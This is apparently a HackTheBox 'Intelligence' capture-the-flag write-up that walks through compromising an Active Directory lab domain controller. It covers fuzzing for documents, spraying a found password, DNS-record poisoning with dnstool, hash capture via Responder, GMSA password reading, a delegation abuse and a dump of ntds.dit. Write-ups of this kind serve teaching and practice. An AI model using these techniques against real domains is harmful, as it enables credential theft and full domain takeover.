# HackTheBox-Intelligence

## NMAP

```bash
PORT      STATE SERVICE       REASON          VERSION                                                                                      
53/tcp    open  domain?       syn-ack ttl 127                             
| fingerprint-strings:                                                    
|   DNSVersionBindReqTCP:                                                     
|     version                                                         
|_    bind                                        
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0    
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA     
| http-methods:                                                           
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-07-05 20:55:03Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
| SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
| -----BEGIN CERTIFICATE-----
| MIIF+zCCBOOgAwIBAgITcQAAAALMnIRQzlB+HAAAAAAAAjANBgkqhkiG9w0BAQsF
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
|_ssl-date: 2021-07-05T20:58:07+00:00; +7h03m50s from scanner time.                                                                        [113/292]
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
| SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
|_ssl-date: 2021-07-05T20:58:06+00:00; +7h03m50s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb               
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa                                                    
| Public Key bits: 2048                                                   
| Signature Algorithm: sha256WithRSAEncryption                    
| Not valid before: 2021-04-19T00:43:16                           
| Not valid after:  2022-04-19T00:43:16                           
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88                  
| SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7        
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0                       
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49701/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58957/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/
submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/5%Time=60E30E56%P=x86_64-pc-linux-gnu%r(DNSVe 
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x 
SF:04bind\0\0\x10\0\x03");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 7h03m49s, deviation: 0s, median: 7h03m49s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 2874/tcp): CLEAN (Timeout)
|   Check 2 (port 4953/tcp): CLEAN (Timeout)
|   Check 3 (port 29037/udp): CLEAN (Timeout)
|   Check 4 (port 21343/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-05T20:57:26
|_  start_date: N/A

```

From the scan we can see ports like 88, 389 which are for kerberos and ldap meaning that this windows machine is Active Directory also we can see the domain name which is `intelligence.htb0`

## PORT 80

On port 80 there's a simple web page 

<img src="https://i.imgur.com/zSi8EeY.png"/>

On scrolling down a little we can 2 documents on the web server , on hovering on it , it will show us the path of the pdf file but we can't access the directory listing `documents`

<img src="https://i.imgur.com/XPKFMSF.png"/>

<img src="https://imgur.com/hjdMa23.png"/>

Scrolling further we can see an email adress with a domain `intelligence.htb` , we can further fuzz for subdomain as well so let's add it to our `/etc/hosts` file

<img src="https://i.imgur.com/Af2GNxx.png"/>

<img src="https://i.imgur.com/Psqjisy.png"/>

On viewing the announcment document , it didn't have anything useful

<img src="https://i.imgur.com/jhwmmU1.png"/>

Neither did the other document had anything in it 

<img src="https://i.imgur.com/MVUgAnn.png"/>

So I ran gobuster but , only found `documents` directory which is forbidden

<img src="https://i.imgur.com/PWkvh7k.png"/>

One thing I note that I tried to change the year and month and I got a different pdf 

<img src="https://i.imgur.com/CQGDzRO.png"/>

So this means we need to fuzz for a pdf document by changing month and date so we need a wordlist of numbers in order to do that so I generated a two digit wordlist using `crunch`

<img src="https://i.imgur.com/w0TK2Ku.png"/>

Here I specified the min and max lenght to be 2 as we need the digits 01,02 and so on also I specified that it will be stop generating characters or numbers in this case if it reaches 31 so with `-e` we can do that.

Now in `wfuzz` we can specify two wordlist to use and can utitlize them on different FUZZ parameter like we have the data format in year-month-day so we can FUZZ parameter like this 

`2020-FUZZ-FUZ2Z`

This `FUZ2Z` will tell that use the second worlist you specify so I sorted out the dates and month wordlist

<img src="https://i.imgur.com/KEIkLPh.png"/>

`dates.txt` will being from 01 and end at 31

<img src="https://imgur.com/FVHjOKl.png"/>

`months.txt` will begin at 01 and end at 12

<img src="https://imgur.com/Ymr03ue.png"/>

```bash
wfuzz -c -w months.txt -w dates.txt --hl 29 -u http://intelligence.htb/documents/2020-FUZZ-F
UZ2Z-upload.pdf
```
Here `--hl 29` is for hiding lines and we specify the numer 29 as on that number of lines we were getting 404 status code

<img src="https://i.imgur.com/dqGxypR.png"/>

<img src="https://i.imgur.com/HaSlbMV.png"/>

I tried going through all the pdf's I can on web server but all contain some gibresh and wasn't interesting but when I ran `exiftool` on the pdf document and found who created this document

<img src="https://i.imgur.com/kIlJ1Xk.png"/>

So on running exiftool on every document these are the users names I found

<img src="https://imgur.com/lK75E7Z.png"/>

Copied those usernames in a text file that sorted out the names which were duplicates and put them in a new file

<img src="https://imgur.com/OBFfgUs.png"/>

So we have a total of 26 users that we can check which one's are valid

<img src="http://intelligence.htb/documents/2020-06-04-upload.pdf"/>

But there's a problem we cannot proceed further until we know a valid credential so I moved back looking at those pdf files one by one which was real time consuming and it would have better if I had made a python script but anyways I found a password in one of the pdf files

<img src="https://i.imgur.com/MMQzNzR.png"/>

Now we need to see whose password is this so we have a total of 26 users that we can brute force with this password , I will be using `crackmapexec` , you can use `kerbrute.py` which is a python script for kerbrute too so I'll show it using these two tools

<img src="https://i.imgur.com/MaFEAGc.png"/>

But using `kerbrute.py` I was getting an error with "clock skew being great"

<img src="https://i.imgur.com/eL9psnA.png"/>

<img src="https://i.imgur.com/WGdbsaN.png"/.>

I found an article talking about clock skew

https://techdirectarchive.com/2020/03/21/kerberos-error-clock-skew-too-great-while-getting-initial-credentials/

So the solution would be to set the correct time on DC or  synchronize with DC's time zone so let's just try to login using `evil-winrm` since port 5985 is open on which WinRM runs

<img src="https://i.imgur.com/IuJzHSU.png"/>

And it failed : (

So what we can do is to run `smbmap` to see if we can list shares 

<img src="https://i.imgur.com/LpjAFSC.png"/>

There's a `Users` shares and we can read it so probably from here we can get the `user.txt`

<img src="https://i.imgur.com/xxHSzbk.png"/>

We can also get a powershell script from `IT` share

<img src="https://i.imgur.com/uJmdLhg.png"/>

<img src="https://imgur.com/a5N7NUM.png"/>

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}

```

Now what this powershell script is doing is that it's doing an ldap query for domain names and grabbing those domain names which have `web` in it and then it's going to make a request along with crdentials of `Ted.Graves` user but windows stores them in encrypted form so we won't get those in clear text .

So I searched the LDAP query which is in this script on google which seems to be DNS delegation I further dug and found that it's actually a Unconstrained Delegation so I tried finding some scripts which would add a domain that points to our IP and somehow we listen for that using responder and get the creds


>If a computer, with unconstrained delegations privileges, is compromised, an attacker must wait for a privileged user to authenticate on it (or force it) using Kerberos. The attacker service will receive a TGS containing the user's TGT. That TGT will be used by the service as a proof of identity to obtain access to a target service as the target user

>In order to abuse the unconstrained delegations privileges of a computer account, an attacker must add his machine to the SPNs of the compromised account and add a DNS entry for it.
This allows targets (like Domain Controllers and Exchange servers) to authenticate back to the attacker machine.
This can be done with addspn, dnstool and krbrelayx (Python).


https://cheatsheet.haax.fr/windows-systems/privilege-escalation/delegations/

https://github.com/dirkjanm/krbrelayx

So we'll just use `dnstool` to add a domain name which will point to our IP address

```bash

python3 dnstool.py -u intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -r web.intelligence.htb -a add -d YOUR_IP TARGET_IP

```

<img src="https://i.imgur.com/2NwwtJl.png"/>


And after adding it we'll run `responder` , Responder an LLMNR, NBT-NS and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) It supports NTLMv1, NTLMv2 hashes

<img src="https://i.imgur.com/KjkU2c3.png"/>

<img src="https://i.imgur.com/fXv4tkt.png"/>

Boom ,we got the the NTLMv2 hash , now we need to crack this hash , I'll use `hashcat`

<img src="https://i.imgur.com/s5LnOMt.png"/>

<img src="https://i.imgur.com/EEaDfMu.png"/>

<img src="https://i.imgur.com/eXJnUYt.png"/>

After getting the password so I thought of maybe running `python bloodhound injestor` through which we can enumerate the AD and then pass those json files to `bloohound`

<img src="https://i.imgur.com/P2Poq6F.png"/>

<img src="https://i.imgur.com/lMpJIuE.png"/>

Start `neo4j` and bloodhound ,I have configured bloodhound in a way that it doesn't ask for password you can search on how to do it as well anyways launching bloodhound

<img src="https://i.imgur.com/UGttwJS.png"/>

Make an archive of those files and then drag and drop to GUI

<img src="https://imgur.com/yowh4BY.png"/>

Now we can run `Shortest Path to Unconstrained Delegation Systems` query

<img src="https://i.imgur.com/m4goLFm.png"/>

We can see that the user `Ted.Graves` is a member of ITSupport group further more that group has access to `ReadGSMAPPassword` through which can get to Service account `SVC_INT`

We can read about this as well 

<img src="https://i.imgur.com/xVBxbrg.png"/>

Further we can read about `AllowedToDelegate`

<img src="https://i.imgur.com/6VT3b95.png"/>

So the first step is to somehow abuse reading GMSA password for that I searched for a python script 

<img src="https://i.imgur.com/joGqzGg.png"/>

After running this script we get a hash for service account

<img src="https://i.imgur.com/NNwxWg2.png"/>

We can now abuse it using `Constrained Delegtaion`

<img src="https://i.imgur.com/cuh4Lhg.png"/>

I followed this command

<img src="https://i.imgur.com/bb0rUGS.png"/>

<img src="https://i.imgur.com/nqEFegR.png"/>

But it throws again that clock skew error, so I added `dc.intelligence.htb` in my `/etc/hosts` file and did `ntpdate dc.intelligence,htb` so that my machine gets synced with DC's time zone


<img src="https://i.imgur.com/sYFYgyD.png"/>

<img src="https://i.imgur.com/3SKZjoc.png"/>

<img src="https://i.imgur.com/R386ctQ.png"/>

We got the adminstarator ticket , now we need to export a variable named `KRB5CCNAME  ` 

<img src="https://imgur.com/gyjgyBj.png"/>

<img src="https://i.imgur.com/g6tQoVb.png"/>

And boom , we hit the gold mine dumping `ntds.dit` from domain controller , now we can use `evil-winrm` to log in since `WinRM` is running on port 5985

<img src="https://i.imgur.com/5JyM3a3.png"/>

Note that you can revert back to your time zone with `ntpdate ntp.ubuntu.com`
